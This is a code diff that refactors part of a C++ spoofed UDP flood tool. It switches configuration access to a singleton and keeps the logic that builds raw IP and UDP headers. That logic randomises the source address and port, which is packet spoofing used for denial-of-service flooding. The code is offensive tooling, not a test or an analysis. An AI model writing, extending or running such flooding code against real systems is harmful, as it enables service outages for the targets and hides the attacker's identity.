@@ -1,10 +1,8 @@
 #include "spoofed_udp_flood.h"
+#include "stdafx.h"
 #include "utils.h"
 
-#include <cstring>
-
-spoofed_udp_flood::spoofed_udp_flood(std::shared_ptr<Config> config)
-    : base_spoofed_flood(std::move(config), IPPROTO_UDP) {}
+spoofed_udp_flood::spoofed_udp_flood() : base_spoofed_flood(IPPROTO_UDP) {}
 
 char *spoofed_udp_flood::gen_hdr(sockaddr_in *dst, int len) {
   char *string = new char[len];
@@ -18,7 +16,7 @@ char *spoofed_udp_flood::gen_hdr(sockaddr_in *dst, int len) {
 
   ip->daddr = dst->sin_addr.s_addr;
 
-  if (config->rand_lhost) {
+  if (Config::get().rand_lhost) {
     utils::randomizer::randomIP(ipaddr);
     ip->saddr = inet_addr(ipaddr.c_str());
   } else
@@ -26,7 +24,7 @@ char *spoofed_udp_flood::gen_hdr(sockaddr_in *dst, int len) {
 
   ip->tot_len = htons((uint16_t)len);
 
-  if (config->rand_lport)
+  if (Config::get().rand_lport)
     udp->uh_sport = htons((uint16_t)utils::randomizer::randomPort());
   else
     udp->uh_sport = 0;
@@ -45,7 +43,7 @@ void spoofed_udp_flood::init_hdr(udphdr *udp, iphdr *ip) {
   ip->ttl = 255;
   ip->protocol = IPPROTO_UDP;
 
-  udp->uh_dport = htons((uint16_t)utils::to_int(config->rport));
+  udp->uh_dport = htons((uint16_t)utils::to_int(Config::get().rport));
   udp->uh_ulen = htons(sizeof(struct udphdr));
 }
 
